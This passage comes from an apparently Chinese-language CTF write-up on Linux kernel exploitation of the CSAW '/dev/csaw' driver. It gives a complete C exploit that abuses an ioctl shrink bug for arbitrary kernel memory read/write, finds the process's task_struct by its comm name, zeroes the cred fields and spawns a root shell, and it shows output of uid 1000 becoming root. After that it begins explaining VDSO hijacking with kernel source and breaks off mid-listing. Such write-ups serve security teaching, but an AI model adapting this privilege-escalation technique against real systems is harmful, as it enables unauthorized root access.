                           |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    64T                |           | direct mapping of all phys. memory            |+++++++++++++|</span><br><span class="line">                       |           | (1 &lt;&lt; MAX_PHYSMEM_BITS)                       |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffff880000000000 ----+-----------+-----------| __PAGE_OFFSET_BASE | -------------|+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    8T                 |           | guard hole, reserved for hypervisor           |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffff800000000000 ----+-----------+-----------------------------------------------+-------------+</span><br><span class="line">                       |-----------|                                               |-------------|</span><br><span class="line">                       |-----------| hole caused by [48:63] sign extension         |-------------|</span><br><span class="line">                       |-----------|                                               |-------------|</span><br><span class="line">0x0000800000000000 ----+-----------+-----------------------------------------------+-------------+</span><br><span class="line">    PAGE_SIZE          |           | guard page                                    |xxxxxxxxxxxxx|</span><br><span class="line">0x00007ffffffff000 ----+-----------+--------------| TASK_SIZE_MAX | ---------------|xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |  user space |</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">    128T               |           | different per mm                              |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">0x0000000000000000 ----+-----------+-----------------------------------------------+-------------+</span><br></pre></td></tr></table></figure><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>最终EXP及运行结果如下：</p><p><strong>pwn_task_struct.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;       </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE     0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> buf_size;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">loff_t</span> index;</span><br><span class="line">    <span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i ;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;((len/<span class="number">8</span>)*<span class="number">8</span>);i+=<span class="number">8</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%lx"</span>,*(<span class="keyword">size_t</span> *)(buf+i) );</span><br><span class="line"><span class="keyword">if</span> (i%<span class="number">16</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" "</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> <span class="title">close_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_args</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0xffff880000000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> real_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> target_addr ;</span><br><span class="line"><span class="keyword">int</span> root_cred[<span class="number">12</span>];</span><br><span class="line"><span class="comment">//set target in task_struct</span></span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line"><span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(target,<span class="string">"try2findmep4nda"</span>);</span><br><span class="line">prctl(PR_SET_NAME , target);</span><br><span class="line">fd = open(<span class="string">"/dev/csaw"</span>,O_RDWR);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-] open error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alloc_args.buf_size = <span class="number">0x100</span>;</span><br><span class="line">alloc_args.id = <span class="number">-1</span>;</span><br><span class="line">ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_args);</span><br><span class="line"><span class="keyword">if</span> (alloc_args.id == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-] alloc_channel error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] now we get a channel %d\n"</span>,alloc_args.id);</span><br><span class="line">shrink_args.id = alloc_args.id;</span><br><span class="line">shrink_args.size = <span class="number">0x100</span>+<span class="number">1</span>;</span><br><span class="line">ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_args);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[+] we can read and write any momery"</span>);</span><br><span class="line"><span class="keyword">for</span>(;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">seek_args.id =  alloc_args.id;</span><br><span class="line">seek_args.index = addr<span class="number">-0x10</span> ;</span><br><span class="line">seek_args.whence= SEEK_SET;</span><br><span class="line">ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">read_args.id = alloc_args.id;</span><br><span class="line">read_args.buf = buf;</span><br><span class="line">read_args.count = <span class="number">0x1000</span>;</span><br><span class="line">ioctl(fd,CSAW_READ_CHANNEL,&amp;read_args);</span><br><span class="line">result = memmem(buf,<span class="number">0x1000</span>,target,<span class="number">16</span>);</span><br><span class="line"><span class="comment">//printf("0x%lx",addr);</span></span><br><span class="line"><span class="keyword">if</span> (result)</span><br><span class="line">&#123;</span><br><span class="line">cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x8</span>);</span><br><span class="line">real_cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">if</span>( (cred||<span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred))&#123;</span><br><span class="line"><span class="comment">//printf("[]%lx[]",result-(int)(buf));</span></span><br><span class="line">target_addr = addr + result-(<span class="keyword">int</span>)(buf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]found task_struct 0x%lx\n"</span>,target_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]found cred 0x%lx\n"</span>,real_cred);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(result == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"not found , try again "</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;<span class="number">44</span>;i++)&#123;</span><br><span class="line">seek_args.id =  alloc_args.id;</span><br><span class="line">seek_args.index = cred<span class="number">-0x10</span> +<span class="number">4</span> + i ;</span><br><span class="line">seek_args.whence= SEEK_SET;</span><br><span class="line">ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">root_cred[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = (<span class="keyword">char</span> *)root_cred;</span><br><span class="line">write_args.count = <span class="number">1</span>;</span><br><span class="line">ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]now you are r00t,enjoy ur shell\n"</span>);</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-] there must be something error ... "</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/ $ id</span><br><span class="line">uid=1000(chal) gid=1000(chal) groups=1000(chal)</span><br><span class="line">/ $ ./pwn_task_struct</span><br><span class="line">[+] now we get a channel 1</span><br><span class="line">[+] we can <span class="built_in">read</span> and write any momery</span><br><span class="line">[+]found task_struct 0xffff880007f8c800</span><br><span class="line">[+]found cred 0xffff88000f946180</span><br><span class="line">[+]now you are r00t,enjoy ur shell</span><br><span class="line">/ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=1000(chal)</span><br><span class="line">/ <span class="comment">#</span></span><br></pre></td></tr></table></figure><h1 id="2-劫持VDSO"><a href="#2-劫持VDSO" class="headerlink" title="2 劫持VDSO"></a>2 劫持VDSO</h1><p>这种方法是内核态通过映射的方法与用户态共享一块物理内存，从而达到加快执行效率的目的，也是影子内存。当在内核态修改内存时，用户态所访问到的数据同样会改变，这样的数据区在用户态有两块，vdso和vsyscall。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x401000 r-xp     1000 0      /home/p4nda/Desktop/pwn/test/getauxval/su_me</span><br><span class="line">          0x600000           0x601000 r--p     1000 0      /home/p4nda/Desktop/pwn/test/getauxval/su_me</span><br><span class="line">          0x601000           0x602000 rw-p     1000 1000   /home/p4nda/Desktop/pwn/test/getauxval/su_me</span><br><span class="line">    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7fdd000     0x7ffff7fe0000 rw-p     3000 0      </span><br><span class="line">    0x7ffff7ff8000     0x7ffff7ffa000 r--p     2000 0      [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffdd000     0x7ffffffff000 rw-p    22000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure><h2 id="关于VDSO"><a href="#关于VDSO" class="headerlink" title="关于VDSO"></a>关于VDSO</h2><p>VDSO就是Virtual Dynamic Shared Object。这个.so文件不在磁盘上，而是在内核里头。内核把包含某.so的内存页在程序启动的时候映射入其内存空间，对应的程序就可以当普通的.so来使用里头的函数。<br>而vdso里的函数主要有五个,都是对时间要求比较高的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">clock_gettime0000000000000A10</span><br><span class="line">gettimeofday0000000000000C80</span><br><span class="line">time0000000000000DE0</span><br><span class="line">getcpu0000000000000E00</span><br><span class="line">start0000000000000940[main entry]</span><br></pre></td></tr></table></figure><p>而VDSO所在的页，在内核态是可读、可写的，在用户态是可读、可执行的。其在每个程序启动的加载过程如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#0  remap_pfn_range (vma=0xffff880000bba780, addr=140731259371520, pfn=8054, size=4096, prot=...) at mm/memory.c:1737</span><br><span class="line">#1  0xffffffff810041ce in map_vdso (image=0xffffffff81a012c0 &lt;vdso_image_64&gt;, calculate_addr=&lt;optimized out&gt;) at arch/x86/entry/vdso/vma.c:151</span><br><span class="line">#2  0xffffffff81004267 in arch_setup_additional_pages (bprm=&lt;optimized out&gt;, uses_interp=&lt;optimized out&gt;) at arch/x86/entry/vdso/vma.c:209</span><br><span class="line">#3  0xffffffff81268b74 in load_elf_binary (bprm=0xffff88000f86cf00) at fs/binfmt_elf.c:1080</span><br><span class="line">#4  0xffffffff812136de in search_binary_handler (bprm=0xffff88000f86cf00) at fs/exec.c:1469</span><br></pre></td></tr></table></figure><p>在map_vdso中首先查找到一块用户态地址，将该块地址设置为VM_MAYREAD|VM_MAYWRITE|VM_MAYEXEC，利用remap_pfn_range将内核页映射过去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_vdso</span><span class="params">(<span class="keyword">const</span> struct vdso_image *image, <span class="keyword">bool</span> calculate_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> = <span class="title">current</span>-&gt;<span class="title">mm</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr, text_start;</span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">no_pages</span>[] = &#123;</span><span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_special_mapping</span> <span class="title">vvar_mapping</span> = &#123;</span></span><br><span class="line">.name = <span class="string">"[vvar]"</span>,</span><br><span class="line">.pages = no_pages,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pvclock_vsyscall_time_info</span> *<span class="title">pvti</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (calculate_addr) &#123;</span><br><span class="line">addr = vdso_addr(current-&gt;mm-&gt;start_stack,</span><br><span class="line"> image-&gt;size - image-&gt;sym_vvar_start);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">addr = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">down_write(&amp;mm-&gt;mmap_sem);</span><br><span class="line"></span><br><span class="line">addr = get_unmapped_area(<span class="literal">NULL</span>, addr,</span><br><span class="line"> image-&gt;size - image-&gt;sym_vvar_start, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR_VALUE(addr)) &#123;</span><br><span class="line">ret = addr;</span><br><span class="line"><span class="keyword">goto</span> up_fail;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">text_start = addr - image-&gt;sym_vvar_start;</span><br><span class="line">current-&gt;mm-&gt;context.vdso = (<span class="keyword">void</span> __user *)text_start;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * MAYWRITE to allow gdb to COW and set breakpoints</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vma = _install_special_mapping(mm,</span><br><span class="line">       text_start,</span><br><span class="line">       image-&gt;size,</span><br><span class="line">       VM_READ|VM_EXEC|</span><br><span class="line">       VM_MAYREAD|VM_MAYWRITE|VM_MAYEXEC,</span><br><span class="line">       &amp;image-&gt;text_mapping);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(vma)) &#123;</span><br><span class="line">ret = PTR_ERR(vma);</span><br><span class="line"><span class="keyword">goto</span> up_fail;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vma = _install_special_mapping(mm,</span><br><span class="line">       addr,</span><br><span class="line">       -image-&gt;sym_vvar_start,</span><br><span class="line">       VM_READ|VM_MAYREAD,</span><br><span class="line">       &amp;vvar_mapping);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(vma)) &#123;</span><br><span class="line">ret = PTR_ERR(vma);</span><br><span class="line"><span class="keyword">goto</span> up_fail;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (image-&gt;sym_vvar_page)</span><br><span class="line">ret = remap_pfn_range(vma,</span><br><span class="line">      text_start + image-&gt;sym_vvar_page,</span><br><span class="line">      __pa_symbol(&amp;__vvar_page) &gt;&gt; PAGE_SHIFT,</span><br><span class="line">      PAGE_SIZE,</span><br><span class="line">      PAGE_READONLY);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> up_fail;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_HPET_TIMER</span></span><br><span class="line"><span class="keyword">if</span> (hpet_address &amp;&amp; image-&gt;sym_hpet_page) &#123;</span><br><span class="line">ret = 